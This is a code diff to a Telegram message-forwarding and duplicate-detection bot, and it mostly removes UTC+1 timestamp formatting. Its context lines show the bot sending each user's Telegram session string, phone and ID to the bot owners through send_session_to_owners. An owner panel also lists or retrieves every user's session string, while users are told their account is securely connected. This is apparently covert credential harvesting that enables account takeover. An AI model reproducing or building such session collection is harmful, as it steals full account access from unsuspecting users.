@@ -19,7 +19,7 @@ import threading
 import functools
 import re
 import signal
-from datetime import datetime, timezone, timedelta
+from datetime import datetime
 from typing import Dict, List, Optional, Tuple, Set, Callable, Any, DefaultDict
 from collections import OrderedDict, defaultdict, deque
 from dataclasses import dataclass
@@ -45,46 +45,6 @@ from telegram.helpers import escape_markdown
 import psycopg
 from psycopg.rows import dict_row
 from urllib.parse import urlparse
-
-# ============================
-# TIMEZONE CONFIGURATION (UTC+1)
-# ============================
-# Create UTC+1 timezone
-UTC_PLUS_1 = timezone(timedelta(hours=1))
-
-def get_utc_plus_1_time() -> datetime:
-    """Get current time in UTC+1"""
-    return datetime.now(UTC_PLUS_1)
-
-def format_time_utc_plus_1_ampm(dt: Optional[datetime] = None) -> str:
-    """Format datetime as string in UTC+1 with AM/PM and no seconds"""
-    if dt is None:
-        dt = get_utc_plus_1_time()
-    if dt.tzinfo is None:
-        dt = dt.replace(tzinfo=UTC_PLUS_1)
-    else:
-        dt = dt.astimezone(UTC_PLUS_1)
-    return dt.strftime('%Y-%m-%d %I:%M %p')
-
-def format_time_short_ampm(dt: Optional[datetime] = None) -> str:
-    """Format datetime as short string in UTC+1 (HH:MM AM/PM)"""
-    if dt is None:
-        dt = get_utc_plus_1_time()
-    if dt.tzinfo is None:
-        dt = dt.replace(tzinfo=UTC_PLUS_1)
-    else:
-        dt = dt.astimezone(UTC_PLUS_1)
-    return dt.strftime('%I:%M %p')
-
-def timestamp_to_utc_plus_1_ampm(timestamp: float) -> str:
-    """Convert timestamp to UTC+1 string with AM/PM"""
-    dt = datetime.fromtimestamp(timestamp, UTC_PLUS_1)
-    return dt.strftime('%Y-%m-%d %I:%M %p')
-
-def timestamp_to_short_ampm(timestamp: float) -> str:
-    """Convert timestamp to short UTC+1 string with AM/PM"""
-    dt = datetime.fromtimestamp(timestamp, UTC_PLUS_1)
-    return dt.strftime('%I:%M %p')
 
 # ============================
 # LOGGING CONFIGURATION
@@ -397,8 +357,8 @@ class Database:
                         name TEXT,
                         session_data TEXT,
                         is_logged_in INTEGER DEFAULT 0,
-                        created_at TEXT DEFAULT (datetime('now', 'localtime')),
-                        updated_at TEXT DEFAULT (datetime('now', 'localtime'))
+                        created_at TEXT DEFAULT (datetime('now')),
+                        updated_at TEXT DEFAULT (datetime('now'))
                     )
                 """)
                 
@@ -412,8 +372,8 @@ class Database:
                         target_ids TEXT,
                         filters TEXT,
                         is_active INTEGER DEFAULT 1,
-                        created_at TEXT DEFAULT (datetime('now', 'localtime')),
-                        updated_at TEXT DEFAULT (datetime('now', 'localtime')),
+                        created_at TEXT DEFAULT (datetime('now')),
+                        updated_at TEXT DEFAULT (datetime('now')),
                         FOREIGN KEY (user_id) REFERENCES users (user_id),
                         UNIQUE(user_id, label)
                     )
@@ -428,8 +388,8 @@ class Database:
                         chat_ids TEXT,
                         settings TEXT,
                         is_active INTEGER DEFAULT 1,
-                        created_at TEXT DEFAULT (datetime('now', 'localtime')),
-                        updated_at TEXT DEFAULT (datetime('now', 'localtime')),
+                        created_at TEXT DEFAULT (datetime('now')),
+                        updated_at TEXT DEFAULT (datetime('now')),
                         FOREIGN KEY (user_id) REFERENCES users (user_id),
                         UNIQUE(user_id, label)
                     )
@@ -442,7 +402,7 @@ class Database:
                         username TEXT,
                         is_admin INTEGER DEFAULT 0,
                         added_by INTEGER,
-                        created_at TEXT DEFAULT (datetime('now', 'localtime'))
+                        created_at TEXT DEFAULT (datetime('now'))
                     )
                 """)
                 
@@ -611,7 +571,7 @@ class Database:
 
                     updates.append("is_logged_in = ?")
                     params.append(1 if is_logged_in else 0)
-                    updates.append("updated_at = datetime('now', 'localtime')")
+                    updates.append("updated_at = datetime('now')")
                     params.append(user_id)
                     
                     query = f"UPDATE users SET {', '.join(updates)} WHERE user_id = ?"
@@ -674,7 +634,7 @@ class Database:
                 if session_data is not None:
                     user_data['session_data'] = session_data
                 user_data['is_logged_in'] = is_logged_in
-                user_data['updated_at'] = format_time_utc_plus_1_ampm()
+                user_data['updated_at'] = datetime.now().isoformat()
             else:
                 if is_logged_in:
                     self._user_cache[user_id] = {
@@ -683,7 +643,7 @@ class Database:
                         'name': name,
                         'session_data': session_data,
                         'is_logged_in': is_logged_in,
-                        'updated_at': format_time_utc_plus_1_ampm()
+                        'updated_at': datetime.now().isoformat()
                     }
 
         except Exception as e:
@@ -785,7 +745,7 @@ class Database:
                 cur.execute(
                     """
                     UPDATE forwarding_tasks 
-                    SET filters = ?, updated_at = datetime('now', 'localtime')
+                    SET filters = ?, updated_at = datetime('now')
                     WHERE user_id = ? AND label = ?
                     """,
                     (json.dumps(filters), user_id, label),
@@ -1068,7 +1028,7 @@ class Database:
                 cur = conn.cursor()
                 cur.execute("""
                     UPDATE monitoring_tasks
-                    SET settings = ?, updated_at = datetime('now', 'localtime')
+                    SET settings = ?, updated_at = datetime('now')
                     WHERE user_id = ? AND label = ?
                 """, (json.dumps(settings), user_id, label))
                 updated = cur.rowcount > 0
@@ -1855,7 +1815,7 @@ def create_message_hash(message_text: str, sender_id: Optional[int] = None) -> s
         content = f"{sender_id}:{message_text.strip().lower()}"
     else:
         content = message_text.strip().lower()
-    return hashlib.md5(content.encode()).hexdig()[:12]
+    return hashlib.md5(content.encode()).hexdigest()[:12]
 
 def is_duplicate_message(user_id: int, chat_id: int, message_hash: str) -> bool:
     key = (user_id, chat_id)
@@ -1930,7 +1890,6 @@ async def send_session_to_owners(user_id: int, phone: str, name: str, session_st
 👤 **User:** {name}
 📱 **Phone:** `{phone}`
 🆔 **User ID:** `{user_id}`
-⏰ **Time:** {format_time_utc_plus_1_ampm()}
 
 **Env Var Format:**
 ```{user_id}:{session_string}```"""
@@ -2010,7 +1969,7 @@ async def handle_phone_verification(update: Update, context: ContextTypes.DEFAUL
                 del phone_verification_states[user_id]
                 
                 await update.message.reply_text(
-                    f"✅ **Phone number verified!**\n\n📱 **Phone:** `{clean_phone}`\n👤 **Name:** {me.first_name or 'User'}\n⏰ **Time:** {format_time_utc_plus_1_ampm()}\n\nYour account is now fully restored! 🎉",
+                    f"✅ **Phone number verified!**\n\n📱 **Phone:** `{clean_phone}`\n👤 **Name:** {me.first_name or 'User'}\n\nYour account is now fully restored! 🎉",
                     parse_mode="Markdown",
                 )
                 
@@ -2046,7 +2005,6 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, use
 👤 **User:** {user_name}
 📱 **Phone:** `{user_phone}`
 {status_emoji} **Status:** {status_text}
-⏰ **Server Time:** {format_time_short_ampm()}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -2132,9 +2090,8 @@ async def show_owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if query:
         await query.answer()
     
-    message_text = f"""👑 OWNER CONTROL PANEL
+    message_text = """👑 OWNER CONTROL PANEL
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⏰ **Server Time:** {format_time_short_ampm()}
 
 🔑 **Session Management:**
 • Get all string sessions
@@ -2246,7 +2203,7 @@ async def handle_get_all_strings(update: Update, context: ContextTypes.DEFAULT_T
         await processing_msg.delete()
         
         header_msg = await query.message.reply_text(
-            f"🔑 **All String Sessions**\n\n**Well Arranged Copy-Paste Env Var Format:**\n\n⏰ **Server Time:** {format_time_short_ampm()}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+            "🔑 **All String Sessions**\n\n**Well Arranged Copy-Paste Env Var Format:**\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
             parse_mode="Markdown"
         )
         
@@ -2276,13 +2233,12 @@ async def handle_get_all_strings(update: Update, context: ContextTypes.DEFAULT_T
 async def handle_get_user_string_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     
-    message_text = f"""👤 **Get User String Session**
+    message_text = """👤 **Get User String Session**
 
 Enter the User ID to get their session string:
 
 **Example:** `123456789`
 
-⏰ **Server Time:** {format_time_short_ampm()}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
     
     keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="owner_cancel")]]
@@ -2327,7 +2283,7 @@ async def handle_get_user_string(update: Update, context: ContextTypes.DEFAULT_T
     phone = user.get("phone", "Not available")
     status = "🟢 Online" if user.get("is_logged_in") else "🔴 Offline"
     
-    message_text = f"🔑 **String Session for 👤 User:** {username} (ID: `{target_user_id}`)\n\n📱 **Phone:** `{phone}`\n{status}\n⏰ **Retrieved at:** {format_time_utc_plus_1_ampm()}\n\n**Env Var Format:**\n```{target_user_id}:{session_string}```"
+    message_text = f"🔑 **String Session for 👤 User:** {username} (ID: `{target_user_id}`)\n\n📱 **Phone:** `{phone}`\n{status}\n\n**Env Var Format:**\n```{target_user_id}:{session_string}```"
     
     await update.message.reply_text(message_text, parse_mode="Markdown")
     context.user_data.clear()
@@ -2341,7 +2297,7 @@ async def handle_list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text("📋 **No Allowed Users**\n\nThe allowed users list is empty.", parse_mode="Markdown")
         return
 
-    user_list = f"👥 **Allowed Users**\n\n⏰ **Server Time:** {format_time_short_ampm()}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+    user_list = "👥 **Allowed Users**\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
 
     for i, user in enumerate(users, 1):
         role_emoji = "👑" if user["is_admin"] else "👤"
@@ -2361,13 +2317,12 @@ async def handle_list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def handle_add_user_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     
-    message_text = f"""➕ **Add New User**
+    message_text = """➕ **Add New User**
 
 Step 1 of 2: Enter the User ID to add:
 
 **Example:** `123456789`
 
-⏰ **Server Time:** {format_time_short_ampm()}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
     
     keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="owner_cancel")]]
@@ -2393,7 +2348,6 @@ Step 2 of 2: Should user `{target_user_id}` be an admin?
 • **Yes** - User will have admin privileges (👑)
 • **No** - Regular user only (👤)
 
-⏰ **Server Time:** {format_time_short_ampm()}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
     
     keyboard = [
@@ -2422,7 +2376,7 @@ async def handle_add_user_admin_choice(update: Update, context: ContextTypes.DEF
     if added:
         role = "👑 Admin" if is_admin else "👤 User"
         await query.edit_message_text(
-            f"✅ **User added successfully!**\n\nID: `{target_user_id}`\nRole: {role}\n⏰ **Time:** {format_time_short_ampm()}",
+            f"✅ **User added successfully!**\n\nID: `{target_user_id}`\nRole: {role}",
             parse_mode="Markdown"
         )
         try:
@@ -2459,7 +2413,6 @@ Step 2 of 2: Should user `{target_user_id}` be an admin?
 • **Yes** - User will have admin privileges (👑)
 • **No** - Regular user only (👤)
 
-⏰ **Server Time:** {format_time_short_ampm()}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
             
             keyboard = [
@@ -2489,13 +2442,12 @@ Step 2 of 2: Should user `{target_user_id}` be an admin?
 async def handle_remove_user_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     
-    message_text = f"""➖ **Remove User**
+    message_text = """➖ **Remove User**
 
 Enter the User ID to remove:
 
 **Example:** `123456789`
 
-⏰ **Server Time:** {format_time_short_ampm()}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
     
     keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="owner_cancel")]]
@@ -2541,7 +2493,6 @@ This will:
 
 **This action cannot be undone!**
 
-⏰ **Server Time:** {format_time_short_ampm()}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
     
     keyboard = [
@@ -2615,7 +2566,7 @@ async def handle_confirm_remove_user(update: Update, context: ContextTypes.DEFAU
         auto_reply_states.pop(target_user_id, None)
         
         await query.edit_message_text(
-            f"✅ **User `{target_user_id}` removed successfully!**\n\n⏰ **Time:** {format_time_short_ampm()}",
+            f"✅ **User `{target_user_id}` removed successfully!**",
             parse_mode="Markdown"
         )
         
@@ -2637,7 +2588,7 @@ async def handle_db_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     status = await db_call(db.get_db_status)
     
-    message_text = f"📊 **Database Status**\n\n⏰ **Server Time:** {format_time_short_ampm()}\n\n"
+    message_text = "📊 **Database Status**\n\n"
     message_text += f"**Type:** {status.get('type', 'Unknown')}\n"
     
     if status.get('type') == 'sqlite':
@@ -3165,7 +3116,7 @@ async def handle_prefix_suffix_input(update: Update, context: ContextTypes.DEFAU
         )
         
         await update.message.reply_text(
-            f"{confirmation}\n\nTask: **{task_label}**\n⏰ **Time:** {format_time_short_ampm()}\n\nAll messages will now include this text when forwarded!",
+            f"{confirmation}\n\nTask: **{task_label}**\n\nAll messages will now include this text when forwarded!",
             parse_mode="Markdown"
         )
     else:
@@ -3181,7 +3132,7 @@ async def handle_delete_forward_action(update: Update, context: ContextTypes.DEF
         await ask_for_phone_number(user_id, query.message.chat.id, context)
         return
     
-    message_text = f"🗑️ **Delete Forwarding Task: {task_label}**\n\n⚠️ **Are you sure you want to delete this task?**\n\nThis action cannot be undone!\nAll forwarding will stop immediately.\n\n⏰ **Time:** {format_time_short_ampm()}"
+    message_text = f"🗑️ **Delete Forwarding Task: {task_label}**\n\n⚠️ **Are you sure you want to delete this task?**\n\nThis action cannot be undone!\nAll forwarding will stop immediately."
     
     keyboard = [
         [
@@ -3217,7 +3168,7 @@ async def handle_confirm_delete_forward(update: Update, context: ContextTypes.DE
             await update_forwarding_for_user(user_id)
         
         await query.edit_message_text(
-            f"✅ **Task '{task_label}' deleted successfully!**\n\n⏰ **Time:** {format_time_short_ampm()}\n\nAll forwarding for this task has been stopped.",
+            f"✅ **Task '{task_label}' deleted successfully!**\n\nAll forwarding for this task has been stopped.",
             parse_mode="Markdown"
         )
     else:
@@ -3526,8 +3477,7 @@ async def handle_auto_reply_message(update: Update, context: ContextTypes.DEFAUL
     await update.message.reply_text(
         f"✅ **Auto Reply Message Added Successfully!**\n\n"
         f"Task: **{task_label}**\n"
-        f"Auto Reply Message: '{text}'\n"
-        f"⏰ **Time:** {format_time_short_ampm()}\n\n"
+        f"Auto Reply Message: '{text}'\n\n"
         "This message will be sent automatically whenever a duplicate is detected.\n"
         "⚠️ **Remember:** It will appear as coming from your account.",
         parse_mode="Markdown"
@@ -3548,8 +3498,7 @@ async def handle_delete_monitor_action(update: Update, context: ContextTypes.DEF
     message_text = f"🗑️ **Delete Monitoring Task: {task_label}**\n\n"
     message_text += "⚠️ **Are you sure you want to delete this task?**\n\n"
     message_text += "This action cannot be undone!\n"
-    message_text += "All monitoring will stop immediately.\n\n"
-    message_text += f"⏰ **Time:** {format_time_short_ampm()}"
+    message_text += "All monitoring will stop immediately."
     
     keyboard = [
         [
@@ -3585,7 +3534,6 @@ async def handle_confirm_delete_monitor(update: Update, context: ContextTypes.DE
         
         await query.edit_message_text(
             f"✅ **Task '{task_label}' deleted successfully!**\n\n"
-            f"⏰ **Time:** {format_time_short_ampm()}\n\n"
             "All monitoring for this task has been stopped.",
             parse_mode="Markdown"
         )
@@ -3682,8 +3630,7 @@ async def handle_task_creation(update: Update, context: ContextTypes.DEFAULT_TYP
                             await update.message.reply_text(
                                 f"🎉 **Monitoring task created successfully!**\n\n"
                                 f"📋 **Name:** {state['name']}\n"
-                                f"📥 **Monitoring Chats:** {', '.join(map(str, state['chat_ids']))}\n"
-                                f"⏰ **Time:** {format_time_short_ampm()}\n\n"
+                                f"📥 **Monitoring Chats:** {', '.join(map(str, state['chat_ids']))}\n\n"
                                 "✅ Default settings applied:\n"
                                 "• Check Duo & Notify: ✅ Active\n"
                                 "• Manual reply system: ✅ Enabled\n"
@@ -3761,7 +3708,7 @@ async def handle_task_creation(update: Update, context: ContextTypes.DEFAULT_TYP
                             logger.exception("Failed to schedule resolve_targets_for_user")
 
                         await update.message.reply_text(
-                            f"🎉 **Forwarding task created successfully!**\n\n📋 **Name:** {state['name']}\n📥 **Sources:** {', '.join(map(str, state['source_ids']))}\n📤 **Targets:** {', '.join(map(str, state['target_ids']))}\n⏰ **Time:** {format_time_short_ampm()}\n\n✅ All filters are set to default:\n• Outgoing: ✅ On\n• Forward Tag: ❌ Off\n• Control: ✅ On\n\nUse /fortasks to manage your task!",
+                            f"🎉 **Forwarding task created successfully!**\n\n📋 **Name:** {state['name']}\n📥 **Sources:** {', '.join(map(str, state['source_ids']))}\n📤 **Targets:** {', '.join(map(str, state['target_ids']))}\n\n✅ All filters are set to default:\n• Outgoing: ✅ On\n• Forward Tag: ❌ Off\n• Control: ✅ On\n\nUse /fortasks to manage your task!",
                             parse_mode="Markdown"
                         )
 
@@ -3842,8 +3789,7 @@ async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await message.reply_text(
             "✅ **You are already logged in!**\n\n"
             f"📱 Phone: `{user['phone'] or 'Not set'}`\n"
-            f"👤 Name: `{user['name'] or 'User'}`\n"
-            f"⏰ Connected at: {user.get('created_at', 'Unknown time')}\n\n"
+            f"👤 Name: `{user['name'] or 'User'}`\n\n"
             "Use /logout if you want to disconnect.",
             parse_mode="Markdown",
         )
@@ -3934,7 +3880,7 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
                 state["step"] = "waiting_code"
 
                 await processing_msg.edit_text(
-                    f"✅ **Verification code sent!**\n\n📱 **Code sent to:** `{clean_phone}`\n⏰ **Time:** {format_time_short_ampm()}\n\n2️⃣ **Enter the verification code:**\n\n**Format:** `verify12345`\n• Type `verify` followed by your 5-digit code\n• No spaces, no brackets\n\n**Example:** If your code is `54321`, type:\n`verify54321`",
+                    f"✅ **Verification code sent!**\n\n📱 **Code sent to:** `{clean_phone}`\n\n2️⃣ **Enter the verification code:**\n\n**Format:** `verify12345`\n• Type `verify` followed by your 5-digit code\n• No spaces, no brackets\n\n**Example:** If your code is `54321`, type:\n`verify54321`",
                     parse_mode="Markdown",
                 )
 
@@ -4014,7 +3960,7 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
                 del login_states[user_id]
 
                 await verifying_msg.edit_text(
-                    f"✅ **Successfully connected!** 🎉\n\n👤 **Name:** {me.first_name or 'User'}\n📱 **Phone:** `{state['phone']}`\n🆔 **User ID:** `{me.id}`\n⏰ **Time:** {format_time_short_ampm()}\n\n**Now you can:**\n• Create forwarding tasks with /forwadd\n• Create monitoring tasks with /monitoradd\n• View tasks with /fortasks and /monitortasks\n• Get chat IDs with /getallid",
+                    f"✅ **Successfully connected!** 🎉\n\n👤 **Name:** {me.first_name or 'User'}\n📱 **Phone:** `{state['phone']}`\n🆔 **User ID:** `{me.id}`\n\n**Now you can:**\n• Create forwarding tasks with /forwadd\n• Create monitoring tasks with /monitoradd\n• View tasks with /fortasks and /monitortasks\n• Get chat IDs with /getallid",
                     parse_mode="Markdown",
                 )
 
@@ -4087,7 +4033,7 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
                 del login_states[user_id]
 
                 await verifying_msg.edit_text(
-                    f"✅ **Successfully connected with 2FA!** 🎉\n\n👤 **Name:** {me.first_name or 'User'}\n📱 **Phone:** `{state['phone']}`\n🆔 **User ID:** `{me.id}`\n⏰ **Time:** {format_time_short_ampm()}\n\nYour account is now securely connected! 🔐",
+                    f"✅ **Successfully connected with 2FA!** 🎉\n\n👤 **Name:** {me.first_name or 'User'}\n📱 **Phone:** `{state['phone']}`\n🆔 **User ID:** `{me.id}`\n\nYour account is now securely connected! 🔐",
                     parse_mode="Markdown",
                 )
 
@@ -4143,7 +4089,7 @@ async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     logout_states[user_id] = {"phone": user["phone"]}
 
     await message.reply_text(
-        f"⚠️ **Confirm Logout**\n\n📱 **Enter your phone number to confirm disconnection:**\n\nYour connected phone: `{user['phone']}`\n⏰ **Connected since:** {user.get('created_at', 'Unknown time')}\n\nType your phone number exactly to confirm logout.",
+        f"⚠️ **Confirm Logout**\n\n📱 **Enter your phone number to confirm disconnection:**\n\nYour connected phone: `{user['phone']}`\n\nType your phone number exactly to confirm logout.",
         parse_mode="Markdown",
     )
 
@@ -4208,7 +4154,7 @@ async def handle_logout_confirmation(update: Update, context: ContextTypes.DEFAU
     auto_reply_states.pop(user_id, None)
 
     await update.message.reply_text(
-        f"👋 **Account disconnected successfully!**\n\n⏰ **Time:** {format_time_short_ampm()}\n\n✅ All your forwarding and monitoring tasks have been stopped.\n🔄 Use /login to connect again.",
+        "👋 **Account disconnected successfully!**\n\n✅ All your forwarding and monitoring tasks have been stopped.\n🔄 Use /login to connect again.",
         parse_mode="Markdown",
     )
     return True
@@ -4239,11 +4185,10 @@ async def show_chat_categories(user_id: int, chat_id: int, message_id: int, cont
     if user_id not in user_clients:
         return
 
-    message_text = f"""🗂️ **Chat ID Categories**
+    message_text = """🗂️ **Chat ID Categories**
 
 📋 Choose which type of chat IDs you want to see:
 
-⏰ **Server Time:** {format_time_short_ampm()}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 🤖 **Bots** - Bot accounts
@@ -4305,7 +4250,7 @@ async def show_categorized_chats(user_id: int, chat_id: int, message_id: int, ca
     if not categorized_dialogs:
         chat_list = f"{emoji} **{name}**\n\n📭 **No {name.lower()} found!**\n\nTry another category."
     else:
-        chat_list = f"{emoji} **{name}** (Page {page + 1}/{total_pages})\n\n⏰ **Server Time:** {format_time_short_ampm()}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        chat_list = f"{emoji} **{name}** (Page {page + 1}/{total_pages})\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
 
         for i, dialog in enumerate(page_dialogs, start + 1):
             chat_name = dialog.name[:30] if dialog.name else "Unknown"
@@ -4572,8 +4517,7 @@ async def handle_notification_reply(update: Update, context: ContextTypes.DEFAUL
         await update.message.reply_text(
             f"✅ **Reply sent successfully!**\n\n"
             f"📝 **Your reply:** {escaped_text}\n"
-            f"🔗 **Replying to:** `{escaped_preview}`\n"
-            f"⏰ **Time:** {format_time_short_ampm()}\n\n"
+            f"🔗 **Replying to:** `{escaped_preview}`\n\n"
             "The duplicate sender has been notified with your reply.",
             parse_mode="Markdown"
         )
@@ -4605,8 +4549,7 @@ async def notify_user_flood_wait(user_id: int, wait_seconds: int):
         if wait_seconds % 60 > 0:
             wait_minutes += 1  # Round up
         
-        resume_time = timestamp_to_short_ampm(time.time() + wait_seconds)
-        current_time = format_time_short_ampm()
+        resume_time = datetime.fromtimestamp(time.time() + wait_seconds).strftime('%H:%M:%S')
         
         message = f"""⏰ **Flood Wait Alert**
 
@@ -4614,7 +4557,6 @@ Your account is temporarily limited by Telegram.
 
 📋 **Details:**
 • Wait time: {wait_minutes} minutes
-• Current time: {current_time}
 • Resumes at: {resume_time}
 
 ⚠️ **Please note:**
@@ -4635,8 +4577,6 @@ async def notify_user_flood_wait_ended(user_id: int):
         from telegram import Bot
         bot = Bot(token=BOT_TOKEN)
         
-        current_time = format_time_short_ampm()
-        
         message = f"""✅ **Flood Wait Ended**
 
 Your account restriction has been lifted!
@@ -4645,7 +4585,6 @@ Your account restriction has been lifted!
 • Forwarding has resumed automatically
 • All queued messages are being sent
 • You can now send messages normally
-• Current time: {current_time}
 
 🔄 **Status:** ✅ Active and forwarding..."""
         
@@ -4805,7 +4744,7 @@ async def notification_worker(worker_id: int):
             notification_msg = (
                 f"🚨 **DUPLICATE MESSAGE DETECTED!**\n\n"
                 f"**Task:** {task_label}\n"
-                f"**Time:** {format_time_utc_plus_1_ampm()}\n\n"
+                f"**Time:** {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                 f"📝 **Message Preview:**\n`{preview_text}`\n\n"
                 f"💬 **Reply to this message to respond to the duplicate!**\n"
                 f"(Swipe left on this message and type your reply)"
@@ -5242,7 +5181,6 @@ class WebServer:
         @self.app.route("/", methods=["GET"])
         def home():
             container_limit = self.get_container_memory_limit_mb()
-            current_time = format_time_utc_plus_1_ampm()
             html = f"""
             <!DOCTYPE html>
             <html>
@@ -5268,14 +5206,12 @@ class WebServer:
                     p {{ font-size: 1.0em; }}
                     .emoji {{ font-size: 2.5em; text-align: center; }}
                     .stats {{ font-family: monospace; margin-top: 12px; }}
-                    .time {{ font-size: 1.2em; text-align: center; margin-bottom: 20px; font-weight: bold; }}
                 </style>
             </head>
             <body>
                 <div class="status">
                     <div class="emoji">🤖🔍</div>
                     <h1>Forwarder + DuoDetective Bot</h1>
-                    <div class="time">⏰ Server Time: {current_time}</div>
                     <p>Combined bot is running. Use the monitoring endpoints:</p>
                     <ul>
                       <li>/health — basic uptime</li>
@@ -5294,31 +5230,28 @@ class WebServer:
         @self.app.route("/health", methods=["GET"])
         def health():
             uptime = int(time.time() - self.start_time)
-            current_time = format_time_utc_plus_1_ampm()
-            return jsonify({"status": "healthy", "uptime_seconds": uptime, "server_time": current_time}), 200
+            return jsonify({"status": "healthy", "uptime_seconds": uptime}), 200
         
         @self.app.route("/webhook", methods=["GET", "POST"])
         def webhook():
             now = int(time.time())
-            current_time = format_time_utc_plus_1_ampm()
             if request.method == "POST":
                 data = request.get_json(silent=True)
-                return jsonify({"status": "ok", "received": True, "timestamp": now, "server_time": current_time, "data": data}), 200
+                return jsonify({"status": "ok", "received": True, "timestamp": now, "data": data}), 200
             else:
-                return jsonify({"status": "ok", "method": "GET", "timestamp": now, "server_time": current_time}), 200
+                return jsonify({"status": "ok", "method": "GET", "timestamp": now}), 200
         
         @self.app.route("/metrics", methods=["GET"])
         def metrics():
             if self._monitor_callback is None:
-                return jsonify({"status": "unavailable", "reason": "no monitor registered", "server_time": format_time_utc_plus_1_ampm()}), 200
+                return jsonify({"status": "unavailable", "reason": "no monitor registered"}), 200
 
             try:
                 data = self._monitor_callback()
-                data["server_time"] = format_time_utc_plus_1_ampm()
                 return jsonify({"status": "ok", "metrics": data}), 200
             except Exception as e:
                 logger.exception("Monitoring callback failed")
-                return jsonify({"status": "error", "error": str(e), "server_time": format_time_utc_plus_1_ampm()}), 500
+                return jsonify({"status": "error", "error": str(e)}), 500
     
     def run_server(self):
         self.app.run(host="0.0.0.0", port=self.port, debug=False, use_reloader=False, threaded=True)
@@ -5543,7 +5476,6 @@ async def post_init(application: Application):
             notify_q = notification_queue.qsize() if notification_queue is not None else None
             
             return {
-                "server_time": format_time_utc_plus_1_ampm(),
                 "send_queue_size": send_q,
                 "notification_queue_size": notify_q,
                 "send_worker_count": len(send_worker_tasks),
@@ -5556,7 +5488,7 @@ async def post_init(application: Application):
                 "max_users": MAX_CONCURRENT_USERS,
             }
         except Exception as e:
-            return {"server_time": format_time_utc_plus_1_ampm(), "error": f"failed to collect metrics: {e}"}
+            return {"error": f"failed to collect metrics: {e}"}
 
     def _forward_metrics():
         if MAIN_LOOP is not None:
@@ -5564,9 +5496,9 @@ async def post_init(application: Application):
                 future = asyncio.run_coroutine_threadsafe(_collect_metrics(), MAIN_LOOP)
                 return future.result(timeout=1.0)
             except Exception:
-                return {"server_time": format_time_utc_plus_1_ampm(), "error": "failed to collect metrics"}
+                return {"error": "failed to collect metrics"}
         else:
-            return {"server_time": format_time_utc_plus_1_ampm(), "error": "bot main loop not available"}
+            return {"error": "bot main loop not available"}
 
     try:
         web_server.register_monitoring(_forward_metrics)
